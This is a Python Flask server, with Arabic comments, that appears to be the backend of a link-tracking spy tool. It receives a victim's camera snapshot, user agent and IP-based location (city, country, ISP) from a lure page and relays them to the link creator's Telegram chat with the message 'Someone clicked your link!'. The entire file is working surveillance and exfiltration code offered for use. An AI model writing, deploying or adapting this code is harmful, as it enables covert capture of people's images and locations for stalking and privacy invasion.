from flask import Flask, request
from telegram import Bot
from flask_cors import CORS
import base64, re

TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
bot = Bot(token=TOKEN)

app = Flask(__name__)
CORS(app)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    user_id = int(data['user_id'])

    # استخراج صورة الكاميرا
    img_data = re.search(r'base64,(.*)', data['image']).group(1)
    img_bytes = base64.b64decode(img_data)

    # معلومات الجهاز
    user_agent = data['user_agent']
    ip_info = data['ip_data']
    ip = ip_info.get('ip')
    country = ip_info.get('country_name')
    city = ip_info.get('city')
    isp = ip_info.get('org')

    # رسالة المعلومات
    info = f"""
📥 Someone clicked your link!

🌍 IP: {ip}
🏙️ City: {city}
🌐 Country: {country}
🧭 ISP: {isp}
🖥️ User-Agent: {user_agent}
"""

    # إرسال لصاحب الرابط فقط
    bot.send_message(chat_id=user_id, text=info)
    bot.send_photo(chat_id=user_id, photo=img_bytes, caption="📸 Camera snapshot")

    return "done"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6362)
